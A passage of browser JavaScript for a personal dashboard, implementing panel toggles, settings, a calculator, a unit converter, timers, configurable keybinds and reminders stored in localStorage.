        panel.style.display = wasOpen ? 'none' : 'block';

        if (!wasOpen) {
            updateStats('panelsOpened');
            trackActivity('DASHBOARD_PANEL_OPEN', `Opened panel: ${panelId}`);
        } else {
            updateStats('panelsClosed');
            trackActivity('DASHBOARD_PANEL_CLOSE', `Closed panel: ${panelId}`);
        }
        
        // Specific re-rendering or setup for certain panels
        if (panelId === 'loginHistoryPanel') { this.renderLoginHistory(); }
        else if (panelId === 'activityLogsDashboardPanel') { renderActivityLogs('dashboardActivityLogs'); }
        else if (panelId === 'statsPanel') { renderDashboardStats(); }
        
        showNotification(`${panel.querySelector('h2')?.textContent?.replace(/[\d\W_]+/g, ' ').trim() || panelId.replace('Panel', ' ')} ${wasOpen ? 'Closed' : 'Opened'}.`);
      },
      
      // Shows specific content tabs within the iPad panel
      showIpadContent: function(contentId) {
        document.querySelectorAll('#ipadPanel .ipad-content').forEach(content => {
          content.style.display = 'none';
          content.setAttribute('aria-hidden', 'true');
        });
        const targetContent = document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1));
        if (targetContent) {
            targetContent.style.display = 'block';
            targetContent.setAttribute('aria-hidden', 'false');
            trackActivity('DASHBOARD_ACTION', `Viewed iPad ${contentId} content`);
        }
      },
      
      // Shows specific content tabs within the Bypass panel
      showBypassContent: function(contentId) {
        document.querySelectorAll('#bypassPanel .bypass-content').forEach(content => {
          content.style.display = 'none';
          content.setAttribute('aria-hidden', 'true');
        });
        const targetContent = document.getElementById(contentId + 'Bypass');
        if (targetContent) {
            targetContent.style.display = 'block';
            targetContent.setAttribute('aria-hidden', 'false');
            trackActivity('DASHBOARD_ACTION', `Viewed bypass ${contentId} content`);
        }
      },

      // Renders the login history panel with data from local storage
      renderLoginHistory: function() {
          const historyContainer = document.getElementById('loginHistoryPanelContent');
          if (historyContainer) {
              historyContainer.innerHTML = '';
              const loginHistory = JSON.parse(localStorage.getItem(LS_LOGIN_HISTORY) || '[]');
              if (loginHistory.length === 0) {
                  historyContainer.innerHTML = '<p style="color:#aaa; padding: 10px;">No login history yet.</p>';
              } else {
                  // Render in reverse chronological order
                  loginHistory.slice().reverse().forEach(entry => {
                      const div = document.createElement('div');
                      div.className = 'activity-log-entry';
                      div.textContent = `[${new Date(entry.timestamp).toLocaleString()}] User: ${entry.user}, ID: ${entry.id}`;
                      historyContainer.appendChild(div);
                  });
              }
          }
      },

      // Initializes settings panel and its interactions
      initSettingsPanel: function() {
        document.getElementById('settingsBtn')?.addEventListener('click', () => {
            dashboard.togglePanel('settingsPanel');
            trackActivity('DASHBOARD_ACTION', 'Opened Settings panel');
        });

        const themeSelect = document.getElementById('themeSelect');
        themeSelect?.addEventListener('change', (e) => {
            const selectedTheme = e.target.value;
            document.body.classList.remove('dark-theme', 'light-theme', 'blue-theme');
            if (selectedTheme !== 'dark-theme') {
                document.body.classList.add(selectedTheme);
                localStorage.setItem(LS_THEME, selectedTheme);
            } else {
                localStorage.removeItem(LS_THEME);
            }
            trackActivity('DASHBOARD_SETTINGS', `Changed theme to: ${selectedTheme}`);
            this.loadThemes();
            showNotification(`Theme set to ${selectedTheme.replace('-theme', '')}.`);
        });

        const toggleAnnouncements = document.getElementById('toggleAnnouncements');
        toggleAnnouncements?.addEventListener('change', (e) => {
            const isEnabled = e.target.checked;
            document.getElementById('announcementBar').style.display = isEnabled ? 'block' : 'none';
            localStorage.setItem('announcementBarEnabled', isEnabled);
            trackActivity('DASHBOARD_SETTINGS', `Announcements toggled ${isEnabled ? 'on' : 'off'}`);
            showNotification(`Announcements ${isEnabled ? 'enabled' : 'disabled'}.`);
        });
        
        const toggleWelcomeNotification = document.getElementById('toggleWelcomeNotification');
        toggleWelcomeNotification?.addEventListener('change', (e) => {
            const isEnabled = e.target.checked;
            localStorage.setItem(LS_WELCOME_NOTIFICATION_DISPLAY, isEnabled);
            trackActivity('DASHBOARD_SETTINGS', `Welcome notification toggled ${isEnabled ? 'on' : 'off'}`);
            showNotification(`Welcome notification on login ${isEnabled ? 'enabled' : 'disabled'}.`);
        });

        document.getElementById('resetLayoutBtn')?.addEventListener('click', () => {
            if (confirm('Are you sure you want to reset dashboard panel positions and sizes? This cannot be undone.')) {
                // Clear interact.js attributes and local storage
                interact('.box, .info-panel').each(function (element) {
                    element.style.width = '';
                    element.style.height = '';
                    element.style.transform = 'translate(0px, 0px)';
                    delete element.dataset.x;
                    delete element.dataset.y;
                });
                localStorage.removeItem(LS_DASHBOARD_LAYOUT);
                this.initPanelInteractions(); // Re-initialize with default positions
                showNotification('Dashboard layout reset to default!');
                trackActivity('DASHBOARD_SETTINGS', 'Reset dashboard layout');
            }
        });
        
        // Auto Logout Inactive (dummy implementation with value persistence)
        const autoLogoutInput = document.getElementById('autoLogoutInactive');
        autoLogoutInput?.addEventListener('change', (e) => {
            const value = parseInt(e.target.value);
            if (isNaN(value) || value < 0) {
                showNotification('Please enter a valid positive number for auto-logout minutes.');
                e.target.value = '';
                localStorage.removeItem(LS_AUTO_LOGOUT_INACTIVE);
            } else {
                localStorage.setItem(LS_AUTO_LOGOUT_INACTIVE, value);
                showNotification(`Auto-logout set to ${value} minutes.`);
                trackActivity('DASHBOARD_SETTINGS', `Auto-logout inactive set to "${value} min"`);
            }
        });

        // Initialize toggle states for all settings checkboxes from local storage
        document.querySelectorAll('#settingsPanel input[type="checkbox"]').forEach(checkbox => {
            const savedState = localStorage.getItem(checkbox.id);
            if (savedState !== null) {
                checkbox.checked = JSON.parse(savedState);
                checkbox.setAttribute('aria-checked', checkbox.checked.toString());
            }
            checkbox.addEventListener('change', (e) => {
                localStorage.setItem(e.target.id, e.target.checked);
                e.target.setAttribute('aria-checked', e.target.checked.toString());
            });
        });

        // Initialize values for settings inputs from local storage (if any, for new ones)
        document.querySelectorAll('#settingsPanel input[type="text"], #settingsPanel input[type="number"]').forEach(input => {
            const savedValue = localStorage.getItem(input.id);
            if (savedValue !== null) {
                input.value = savedValue;
            }
            input.addEventListener('change', (e) => {
                localStorage.setItem(e.target.id, e.target.value);
                trackActivity('DASHBOARD_SETTINGS', `Set "${e.target.id}" to "${e.target.value}"`);
            });
        });
        
        // Initial setup for existing checkbox state (announcements, welcome notification)
        const initToggleState = (id, localStorageKey, defaultState, callback) => {
            const element = document.getElementById(id);
            if (element) {
                const savedState = localStorage.getItem(localStorageKey);
                element.checked = (savedState === null) ? defaultState : JSON.parse(savedState);
                element.setAttribute('aria-checked', element.checked.toString());
                if (callback) callback(element.checked); // Apply initial effect
            }
        };

        initToggleState('toggleAnnouncements', 'announcementBarEnabled', true, (isChecked) => {
            document.getElementById('announcementBar').style.display = isChecked ? 'block' : 'none';
        });
        initToggleState('toggleWelcomeNotification', LS_WELCOME_NOTIFICATION_DISPLAY, true);
        initToggleState('toggleDragHandles', LS_DRAG_HANDLES_TOGGLE, true, (isChecked) => {
            this.initPanelInteractions(); // Re-applies visibility of handles correctly
        });
      },

      // Initializes Calculator functionality and event listeners
      initCalculator: function() {
        document.getElementById('calculatorBtn')?.addEventListener('click', () => {
            dashboard.togglePanel('calculatorPanel');
            trackActivity('DASHBOARD_ACTION', 'Opened Calculator');
        });

        const calc = {
          displayValue: '0', firstOperand: null,
          waitingForSecondOperand: false, operator: null,

          updateDisplay: function() {
            const display = document.getElementById('calcDisplay');
            if (display) display.textContent = this.displayValue;
          },

          inputDigit: function(digit) {
            if (this.waitingForSecondOperand === true) {
              this.displayValue = digit;
              this.waitingForSecondOperand = false;
            } else {
              this.displayValue = this.displayValue === '0' ? digit : this.displayValue + digit;
            }
            this.updateDisplay();
          },

          inputDecimal: function(dot) {
            if (this.waitingForSecondOperand === true) {
                this.displayValue = '0.';
                this.waitingForSecondOperand = false;
                this.updateDisplay();
                return;
            }
            if (!this.displayValue.includes(dot)) {
              this.displayValue += dot;
            }
            this.updateDisplay();
          },

          handleOperator: function(nextOperator) {
            const inputValue = parseFloat(this.displayValue);

            if (this.operator && this.waitingForSecondOperand)  {
              this.operator = nextOperator;
              return;
            }

            if (this.firstOperand === null && !isNaN(inputValue)) {
              this.firstOperand = inputValue;
            } else if (this.operator) {
              const result = this.operate(this.firstOperand, inputValue, this.operator);
              this.displayValue = String(parseFloat(result.toFixed(7)));
              this.firstOperand = result;
            }

            this.waitingForSecondOperand = true;
            this.operator = nextOperator;
            this.updateDisplay();
            trackActivity('CALCULATOR_ACTION', `Entered operator ${nextOperator}`);
          },

          operate: function(firstOperand, secondOperand, operator) {
            if (operator === '+') return firstOperand + secondOperand;
            if (operator === '-') return firstOperand - secondOperand;
            if (operator === '*') return firstOperand * secondOperand;
            if (operator === '/') {
                if (secondOperand === 0) {
                    return NaN; // Indicates error
                }
                return firstOperand / secondOperand;
            }
            if (operator === '%') return firstOperand % secondOperand;
            return secondOperand;
          },

          calculate: function() {
            if (this.firstOperand === null || this.operator === null || this.waitingForSecondOperand) {
                return;
            }

            const secondOperand = parseFloat(this.displayValue);
            let result = this.operate(this.firstOperand, secondOperand, this.operator);

            if (isNaN(result)) {
                this.displayValue = 'Error';
                showNotification("Calculator error: Cannot divide by zero.");
            } else {
                this.displayValue = String(parseFloat(result.toFixed(7)));
            }
            
            this.firstOperand = null;
            this.waitingForSecondOperand = true;
            this.operator = null;
            this.updateDisplay();
            trackActivity('CALCULATOR_ACTION', `Calculated result: ${this.displayValue}`);
          },

          clear: function() {
            this.displayValue = '0';
            this.firstOperand = null;
            this.waitingForSecondOperand = false;
            this.operator = null;
            this.updateDisplay();
            trackActivity('CALCULATOR_ACTION', 'Cleared calculator');
          },

          deleteLast: function() {
              if (this.displayValue === 'Error') { // If it's showing error, clear completely
                  this.clear();
                  return;
              }
              this.displayValue = this.displayValue.slice(0, -1);
              if (this.displayValue === '') {
                  this.displayValue = '0';
              }
              this.updateDisplay();
              trackActivity('CALCULATOR_ACTION', 'Deleted last character');
          },
          
          appendNum: function(num) { this.inputDigit(num); },
          appendOp: function(op) { this.handleOperator(op); }
        };

        window.calculator = calc;

        document.querySelector('#calculatorPanel .calculator-grid')?.addEventListener('click', (event) => {
            const { target } = event;
            if (!target.matches('button')) return;

            if (target.classList.contains('operator')) { calc.handleOperator(target.textContent); }
            else if (target.classList.contains('equal')) { calc.calculate(); }
            else if (target.textContent === 'AC') { calc.clear(); }
            else if (target.textContent === 'DEL') { calc.deleteLast(); }
            else if (target.textContent === '.') { calc.inputDecimal('.'); }
            else { calc.inputDigit(target.textContent); }
        });
        calc.updateDisplay();
      },

      // Initializes Unit Converter
      initUnitConverter: function() {
        document.getElementById('unitConverterBtn')?.addEventListener('click', () => {
            dashboard.togglePanel('unitConverterPanel');
            trackActivity('DASHBOARD_ACTION', 'Opened Unit Converter');
        });

        const units = {
            length: {
                m: { name: 'Meter', to_base: 1 }, km: { name: 'Kilometer', to_base: 1000 }, cm: { name: 'Centimeter', to_base: 0.01 },
                mm: { name: 'Millimeter', to_base: 0.001 }, mi: { name: 'Mile', to_base: 1609.34 }, yd: { name: 'Yard', to_base: 0.9144 },
                ft: { name: 'Foot', to_base: 0.3048 }, in: { name: 'Inch', to_base: 0.0254 }
            },
            mass: {
                kg: { name: 'Kilogram', to_base: 1 }, g: { name: 'Gram', to_base: 0.001 }, mg: { name: 'Milligram', to_base: 0.000001 },
                lb: { name: 'Pound', to_base: 0.453592 }, oz: { name: 'Ounce', to_base: 0.0283495 }
            },
            temperature: {
                c: { name: 'Celsius', to_base_fn: (v) => v, from_base_fn: (v) => v },
                f: { name: 'Fahrenheit', to_base_fn: (v) => (v - 32) * 5 / 9, from_base_fn: (v) => (v * 9 / 5) + 32 },
                k: { name: 'Kelvin', to_base_fn: (v) => v - 273.15, from_base_fn: (v) => v + 273.15 }
            },
            volume: {
                l: { name: 'Liter', to_base: 1 }, ml: { name: 'Milliliter', to_base: 0.001 }, gal: { name: 'Gallon (US)', to_base: 3.78541 },
                qt: { name: 'Quart (US)', to_base: 0.946353 }, cup: { name: 'Cup (US)', to_base: 0.236588 }
            },
            area: {
                sqm: { name: 'Square Meter', to_base: 1 }, sqkm: { name: 'Square Kilometer', to_base: 1e6 },
                sqft: { name: 'Square Foot', to_base: 0.092903 }, sqmi: { name: 'Square Mile', to_base: 2.58999e6 },
                acre: { name: 'Acre', to_base: 4046.86 }
            }
        };

        const conversionTypeSelect = document.getElementById('conversionType');
        const convertFromUnitSelect = document.getElementById('convertFromUnit');
        const convertToUnitSelect = document.getElementById('convertToUnit');
        const convertFromValueInput = document.getElementById('convertFromValue');
        const conversionResultDiv = document.getElementById('conversionResult');
        const convertButton = document.getElementById('convertBtn');

        const populateUnitDropdowns = (type) => {
            const currentUnits = units[type];
            if (!currentUnits) { console.error(`Unknown conversion type: ${type}`); return; }

            convertFromUnitSelect.innerHTML = '';
            convertToUnitSelect.innerHTML = '';
            for (const key in currentUnits) {
                const optionFrom = document.createElement('option');
                optionFrom.value = key; optionFrom.textContent = currentUnits[key].name;
                convertFromUnitSelect.appendChild(optionFrom);

                const optionTo = document.createElement('option');
                optionTo.value = key; optionTo.textContent = currentUnits[key].name;
                convertToUnitSelect.appendChild(optionTo);
            }
            if (convertFromUnitSelect.options.length > 0) convertFromUnitSelect.value = Object.keys(currentUnits)[0];
            if (convertToUnitSelect.options.length > 1) convertToUnitSelect.value = Object.keys(currentUnits)[1];
            else if (convertToUnitSelect.options.length > 0) convertToUnitSelect.value = Object.keys(currentUnits)[0];
        };

        const performConversion = () => {
            const type = conversionTypeSelect?.value;
            const fromUnitKey = convertFromUnitSelect?.value;
            const toUnitKey = convertToUnitSelect?.value;
            const value = parseFloat(convertFromValueInput?.value || '0');

            if (isNaN(value)) { conversionResultDiv.textContent = 'Please enter a valid number.'; return; }

            const fromUnit = units[type]?.[fromUnitKey];
            const toUnit = units[type]?.[toUnitKey];

            if (!fromUnit || !toUnit) {
                showNotification(`Error: Invalid unit selected for type ${type}.`);
                return;
            }

            let result;
            if (type === 'temperature') {
                const valueInBase = fromUnit.to_base_fn(value);
                result = toUnit.from_base_fn(valueInBase);
            } else {
                const valueInBase = value * fromUnit.to_base;
                result = valueInBase / toUnit.to_base;
            }
            
            if (conversionResultDiv) conversionResultDiv.textContent = `Result: ${result.toFixed(5)} ${toUnit.name}`;
            trackActivity('UNIT_CONVERTER_ACTION', `Converted ${value} ${fromUnit.name} to ${toUnit.name}`);
            updateStats('conversionsMade');
        };

        conversionTypeSelect?.addEventListener('change', (e) => { populateUnitDropdowns(e.target.value); performConversion(); });
        convertFromValueInput?.addEventListener('input', performConversion);
        convertFromUnitSelect?.addEventListener('change', performConversion);
        convertToUnitSelect?.addEventListener('change', performConversion);
        convertButton?.addEventListener('click', performConversion);

        // Initial setup
        populateUnitDropdowns('length');
        performConversion();
      },

      // Initializes Timer and Stopwatch utilities
      initUtilities: function() {
        document.getElementById('utilitiesBtn')?.addEventListener('click', () => {
            dashboard.togglePanel('utilitiesPanel');
            trackActivity('DASHBOARD_ACTION', 'Opened Utilities panel');
        });

        // Stopwatch logic
        let stopwatchInterval; let stopwatchSeconds = 0;
        const stopwatchDisplay = document.getElementById('stopwatchDisplay');
        const stopwatchStartBtn = document.getElementById('stopwatchStart');
        const stopwatchStopBtn = document.getElementById('stopwatchStop');
        const stopwatchResetBtn = document.getElementById('stopwatchReset');

        function formatStopwatchTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }

        stopwatchStartBtn?.addEventListener('click', () => {
            if (!stopwatchInterval) {
                stopwatchInterval = setInterval(() => {
                    stopwatchSeconds++;
                    if (stopwatchDisplay) stopwatchDisplay.textContent = formatStopwatchTime(stopwatchSeconds);
                }, 1000);
                showNotification('Stopwatch started!');
                trackActivity('UTILITIES_ACTION', 'Stopwatch started');
                updateStats('stopwatchStarts');
            } else {
                showNotification('Stopwatch is already running.');
            }
        });
        stopwatchStopBtn?.addEventListener('click', () => {
            if (stopwatchInterval) {
                clearInterval(stopwatchInterval); stopwatchInterval = null;
                showNotification('Stopwatch stopped.');
                trackActivity('UTILITIES_ACTION', 'Stopwatch stopped');
            } else {
                showNotification('Stopwatch is not running.');
            }
        });
        stopwatchResetBtn?.addEventListener('click', () => {
            clearInterval(stopwatchInterval); stopwatchInterval = null;
            stopwatchSeconds = 0;
            if (stopwatchDisplay) stopwatchDisplay.textContent = '00:00:00';
            showNotification('Stopwatch reset.');
            trackActivity('UTILITIES_ACTION', 'Stopwatch reset');
        });

        // Countdown Timer logic
        let timerInterval; let totalTimerSeconds = 0;
        const timerDisplay = document.getElementById('timerDisplay');
        const timerMinutesInput = document.getElementById('timerMinutes');
        const timerSecondsInput = document.getElementById('timerSeconds');
        const timerStartBtn = document.getElementById('timerStart');
        const timerStopBtn = document.getElementById('timerStop');
        const timerResetBtn = document.getElementById('timerReset');

        function formatTimerTime(seconds) {
            const mins = String(Math.floor(seconds / 60)).padStart(2, '0');
            const secs = String(seconds % 60).padStart(2, '0');
            return `${mins}:${secs}`;
        }

        function setInitialTimer() {
            // Ensure inputs are treated as numbers and default to 0
            totalTimerSeconds = (parseInt(timerMinutesInput?.value || '0') || 0) * 60 + (parseInt(timerSecondsInput?.value || '0') || 0);
            if (timerDisplay) timerDisplay.textContent = formatTimerTime(totalTimerSeconds);
        }
        setInitialTimer();

        timerMinutesInput?.addEventListener('input', setInitialTimer);
        timerSecondsInput?.addEventListener('input', setInitialTimer);

        timerStartBtn?.addEventListener('click', () => {
            if (!timerInterval && totalTimerSeconds > 0) {
                timerInterval = setInterval(() => {
                    totalTimerSeconds--;
                    if (timerDisplay) timerDisplay.textContent = formatTimerTime(totalTimerSeconds);
                    if (totalTimerSeconds <= 0) {
                        clearInterval(timerInterval); timerInterval = null;
                        if (timerDisplay) timerDisplay.textContent = '00:00';
                        showNotification('Countdown Timer Finished!');
                        trackActivity('UTILITIES_ALERT', 'Countdown timer finished');
                        updateStats('timerStarts');
                    }
                }, 1000);
                showNotification(`Countdown timer started for ${formatTimerTime(totalTimerSeconds)}!`);
                trackActivity('UTILITIES_ACTION', 'Countdown timer started');
            } else if (totalTimerSeconds <= 0) {
                 showNotification('Please set a duration for the timer.');
            } else {
                showNotification('Timer is already running or invalid.');
            }
        });
        timerStopBtn?.addEventListener('click', () => {
            if (timerInterval) {
                clearInterval(timerInterval); timerInterval = null;
                showNotification('Countdown timer stopped.');
                trackActivity('UTILITIES_ACTION', 'Countdown timer stopped');
            } else {
                showNotification('Timer is not running.');
            }
        });
        timerResetBtn?.addEventListener('click', () => {
            if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
            setInitialTimer(); // Reset to input values
            showNotification('Countdown timer reset.');
            trackActivity('UTILITIES_ACTION', 'Countdown timer reset');
        });
      },

      // Initializes keybinds panel and hotkey listeners
      initKeybindsPanel: function() {
          document.getElementById('keybindsBtn')?.addEventListener('click', () => {
              dashboard.togglePanel('keybindsPanel');
              trackActivity('DASHBOARD_ACTION', 'Opened Keybinds panel');
          });

          const keybindInputs = document.querySelectorAll('#keybindsPanel input[type="text"]');
          const saveKeybindsBtn = document.getElementById('saveKeybindsBtn');

          let configuredKeybinds = JSON.parse(localStorage.getItem(LS_KEYBINDS) || '{}');
          const isKeybindsEnabled = JSON.parse(localStorage.getItem('enableKeyboardShortcuts') || 'true');

          // Populates keybind input fields with saved or default values
          function loadKeybinds() {
              keybindInputs.forEach(input => {
                  const action = input.dataset.keybindAction;
                  input.value = configuredKeybinds[action] || input.defaultValue || ''; // Use saved, then default HTML value
                  input.title = `Currently: ${input.value}`; // Tooltip for current keybind
                  input.setAttribute('aria-label', `Keybind for ${action}`);

                  input.readOnly = true; // Prevent direct text editing
                  input.dataset.capturing = 'false'; // Custom flag for capturing mode
                  
                  // Start keybind capture on focus
                  input.addEventListener('focus', () => {
                      if (input.dataset.capturing === 'true') return; // Already capturing
                      input.dataset.capturing = 'true';
                      showNotification('Press desired keys for this keybind. Escape to cancel.', 'Keybind Configuration');
                      input.value = ''; // Clear for new input
                      let capturedKeys = new Set();
                      let currentKeybindString = '';

                      const keyCaptureListener = (e) => {
                          e.preventDefault(); // Prevent default behavior like page reload on Ctrl+R
                          e.stopPropagation(); // Stop event from bubbling up and triggering other listeners

                          capturedKeys.add(e.key.toLowerCase()); // Normalize key to lowercase

                          // Build string (e.g., Ctrl + Alt + KeyA)
                          const pressed = [];
                          if (e.ctrlKey) pressed.push('Ctrl');
                          if (e.altKey) pressed.push('Alt');
                          if (e.shiftKey) pressed.push('Shift');
                          if (e.metaKey) pressed.push('Command'); // For macOS Cmd key

                          const nonModifierKey = e.key;
                          if (!['Control', 'Alt', 'Shift', 'Meta'].includes(nonModifierKey)) {
                              pressed.push(nonModifierKey === ' ' ? 'Space' : nonModifierKey);
                          } else if (pressed.length === 0) { // If only a modifier was pressed and it's not registered
                             // Ignore modifier-only presses, wait for a non-modifier or a modifier + modifier combo
                          }

                          currentKeybindString = pressed.join(' + ');
                          input.value = currentKeybindString; // Update live in input

                          // Detect when user stops pressing keys or explicitly presses "Enter"
                          const endCapture = (event) => {
                              event.preventDefault();
                              event.stopPropagation();
                              if (input.dataset.capturing === 'false') return;

                              document.removeEventListener('keydown', keyCaptureListener, true);
                              document.removeEventListener('keyup', keyupListener, true);
                              document.removeEventListener('keypress', keypressListener, true); // Prevent unwanted double captures

                              // If nothing was captured (e.g. escape key or direct blur), restore previous value
                              if (!currentKeybindString || currentKeybindString.toLowerCase() === 'escape') {
                                input.value = configuredKeybinds[action] || input.defaultValue || '';
                                showNotification('Keybind capture cancelled or empty. Restored to previous value.');
                              } else {
                                  showNotification('Keybind recorded. Click "Save Keybinds" to apply.');
                              }
                              input.blur(); // Trigger blur to exit capture mode gracefully
                              input.dataset.capturing = 'false';
                          };

                          if (nonModifierKey === 'Escape') {
                            endCapture(e);
                          } else if (e.repeat && nonModifierKey !== '') { // Prevent capturing multiple keys during a held press
                            // For simplicity, we just use the last unique set pressed.
                            // To capture *a sequence* (e.g., Ctrl+K then I), that would require more complex state.
                            // This implementation focuses on simultaneous key presses (hotkeys).
                          }

                      };

                      const keyupListener = (e) => {
                          if (e.key === 'Control' || e.key === 'Alt' || e.key === 'Shift' || e.key === 'Meta' || e.key === ' ') {
                              // If only modifiers remain pressed, consider capture ended (if already some keys were pressed).
                              // This allows "Ctrl+C" to register after C is released, or "Ctrl+Alt" if it was intended as such
                              // if(currentKeybindString.split(' + ').रेटरों ').length > 1) { // If it wasn't just modifiers previously.
                              //      endCapture(e);
                              // }
                              // The keyup won't trigger end capture; only a direct Escape or manual blur/click will.
                          }
                          // This listener is important to ensure other keybinds aren't fired globally.
                      }
                       const keypressListener = (e) => e.preventDefault();


                      document.addEventListener('keydown', keyCaptureListener, true); // Capture event before others
                      document.addEventListener('keyup', keyupListener, true); // Handle key release to ensure events don't fall through
                      document.addEventListener('keypress', keypressListener, true); // Also prevent some native key behaviors


                      // If user clicks outside, it should stop capturing
                      const blurListener = (e) => {
                        if (e.target !== input && input.dataset.capturing === 'true') {
                          // Prevent triggering blur on a re-focus caused by capturing mechanism
                          input.removeEventListener('blur', blurListener); // Remove before re-adding
                          endCapture(e);
                        }
                      };
                      input.addEventListener('blur', blurListener, {once: true}); // Trigger when input loses focus
                  });

                  input.addEventListener('input', (e) => { // Catch attempts to type directly
                      if (input.readOnly && input.dataset.capturing !== 'true') {
                        e.target.value = configuredKeybinds[action] || input.defaultValue || '';
                        showNotification("Please use keyboard to set keybind. Field is read-only for typing.", 'Info');
                      }
                  });
              });
          }

          // Saves current keybinds configuration to local storage
          saveKeybindsBtn?.addEventListener('click', saveKeybinds);

          loadKeybinds(); // Initial load of keybinds when panel opens

          // Global keydown listener for executing configured hotkeys
          document.addEventListener('keydown', (e) => {
              // Only trigger if keybinds are enabled and user is not currently typing in an input/textarea
              if (!isKeybindsEnabled || document.activeElement.tagName === 'INPUT' || document.activeElement.tagName === 'TEXTAREA' ||
                  document.activeElement.getAttribute('contenteditable') === 'true' ||
                  document.querySelector('#keybindsPanel input[data-capturing="true"]')) { // Don't trigger if actively capturing
                  return;
              }

              const pressed = [];
              if (e.ctrlKey) pressed.push('Ctrl');
              if (e.altKey) pressed.push('Alt');
              if (e.shiftKey) pressed.push('Shift');
              if (e.metaKey) pressed.push('Command'); // Cmd key (Mac)

              const key = e.key;
              if (!['Control', 'Alt', 'Shift', 'Meta'].includes(key)) {
                  pressed.push(key === ' ' ? 'Space' : key);
              }
              const hotkeyString = pressed.join(' + ');
              
              for (const action in configuredKeybinds) {
                  const storedHotkey = configuredKeybinds[action];
                  if (storedHotkey.toLowerCase() === hotkeyString.toLowerCase()) {
                      e.preventDefault(); // Prevent default browser action
                      executeKeybindAction(action);
                      break;
                  }
              }
          }, true); // Use capture phase to catch event before default browser actions (like Ctrl+R)

          // Executes the function associated with a keybind action
          function executeKeybindAction(action) {
              switch (action) {
                  case 'toggleNotes': document.getElementById('notesBtn')?.click(); break;
                  case 'panic': document.getElementById('panicBtn')?.click(); break;
                  case 'toggleSections': document.getElementById('toggleSectionsBtn')?.click(); break;
                  case 'openCalculator': dashboard.togglePanel('calculatorPanel'); break;
                  case 'openSettings': dashboard.togglePanel('settingsPanel'); break;
                  case 'toggleFullscreen': document.getElementById('fullScreenBtn')?.click(); break;
                  case 'reloadPage':
                      if (confirm('Are you sure you want to reload the page?')) window.location.reload();
                      break;
                  default: console.warn(`No action defined for keybind: ${action}`); showNotification(`No action for "${action}"`);
              }
              trackActivity('DASHBOARD_KEYBIND', `Executed keybind for: ${action}`);
          }
      },
      
      // Initializes Reminders functionality
      initReminders: function() {
        document.getElementById('remindersBtn')?.addEventListener('click', () => {
            dashboard.togglePanel('remindersPanel');
            trackActivity('DASHBOARD_ACTION', 'Opened Reminders panel');
        });

        const reminderTextInput = document.getElementById('reminderTextInput');
        const reminderDateTimeInput = document.getElementById('reminderDateTimeInput');
        const addReminderBtn = document.getElementById('addReminderBtn');
        const remindersList = document.getElementById('remindersList');

        let reminders = JSON.parse(localStorage.getItem(LS_REMINDERS) || '[]');

        function renderReminders() {
            remindersList.innerHTML = '';
            if (reminders.length === 0) {
                remindersList.innerHTML = '<p style="color:#aaa; padding: 10px;">No reminders set.</p>';
                return;
            }

            reminders.sort((a, b) => new Date(a.time) - new Date(b.time)); // Sort by time

            reminders.forEach((r, index) => {
                const div = document.createElement('div');
                div.className = 'activity-log-entry';
                div.style.marginBottom = '5px';
                div.setAttribute('role', 'listitem');

                const reminderTime = new Date(r.time);
                const now = new Date();

                let status = 'Upcoming';
                let textColor = 'var(--update-entry-text)'; // Default text color from theme
                if (reminderTime < now) {
                    status = 'Expired';
                    textColor = 'var(--error-color)'; // Red
                } else if (reminderTime.getTime() - now.getTime() < 3600000) {
                    status = 'Soon';
                    textColor = 'orange';
                }

                div.innerHTML = `<span style="color: ${textColor};">[${status}]</span> ${r.text} (${reminderTime.toLocaleString()}) <button class="small-btn" style="float:right; background-color: #f44336;" data-index="${index}" aria-label="Delete reminder: ${r.text}">Delete</button>`;
                remindersList.appendChild(div);
            });
            setupDeleteReminderListeners();
        }

        function setupDeleteReminderListeners() {
            document.querySelectorAll('#remindersList button').forEach(button => {
                button.addEventListener('click', (e) => {
                    const index = parseInt(e.target.dataset.index);
                    if (!isNaN(index)) {
                        const removedReminder = reminders[index].text;
                        reminders.splice(index, 1);
                        localStorage.setItem(LS_REMINDERS, JSON.stringify(reminders));
                        renderReminders();
                        showNotification(`Reminder deleted: "${removedReminder}"`);
                        trackActivity('REMINDER_ACTION', `Deleted reminder: "${removedReminder}"`);
                    }
                });
            });
        }

        addReminderBtn?.addEventListener('click', () => {
            const text = reminderTextInput?.value.trim();
            const time = reminderDateTimeInput?.value;

            if (!text || !time) {
                showNotification('Please enter both reminder text and time.');
                return;
            }

            const reminderTime = new Date(time);
            if (isNaN(reminderTime.getTime())) {
                showNotification('Invalid date/time for reminder.');
                return;
            }
            if (reminderTime < new Date()) {
                 showNotification('Cannot set reminder in the past.');
                 return;
            }

            reminders.push({ text, time });
            localStorage.setItem(LS_REMINDERS, JSON.stringify(reminders));
            renderReminders();
            showNotification(`Reminder added for ${reminderTime.toLocaleString()}!`);
            trackActivity('REMINDER_ACTION', `Added reminder: "${text}" for ${time}`);
            
            if (reminderTextInput) reminderTextInput.value = '';
            if (reminderDateTimeInput) reminderDateTimeInput.value = '';

            // Set a timer to trigger the notification
            const timeUntilReminder = reminderTime.getTime() - new Date().getTime();
            if (timeUntilReminder > 0) {
                setTimeout(() => {
                    showNotification(`⏰ REMINDER: ${text}`);
                    trackActivity('REMINDER_ALERT', `Reminder triggered: "${text}"`);
                    // Optionally remove reminder after alert if it's a one-time reminder
                    reminders = reminders.filter(r => !(r.time === time && r.text === text));
                    localStorage.setItem(LS_REMINDERS, JSON.stringify(reminders));
                    renderReminders(); // Re-render to show updated list (e.g., to remove triggered)
                }, timeUntilReminder);
            }
        });

        setInterval(renderReminders, 60000); // Re-render every minute to update statuses (Expired, Soon)

        renderReminders(); // Initial render on load
      },
      initStatsButton: function() {
        document.getElementById('statsBtn')?.addEventListener('click', () => {
            dashboard.togglePanel('statsPanel');
            trackActivity('DASHBOARD_ACTION', 'Opened Stats panel');
        });

        document.getElementById('resetStatsBtn')?.addEventListener('click', () => {
            if (confirm('Are you sure you want to reset all dashboard statistics? This cannot be undone.')) {
                dashboardStats = { ...initialStats };
                localStorage.setItem(LS_DASHBOARD_STATS, JSON.stringify(dashboardStats));
                renderDashboardStats();
                showNotification('Dashboard statistics reset.');
                trackActivity('DASHBOARD_ACTION', 'Reset dashboard statistics');
            }
        });
      },
      initMediaButton: function() {
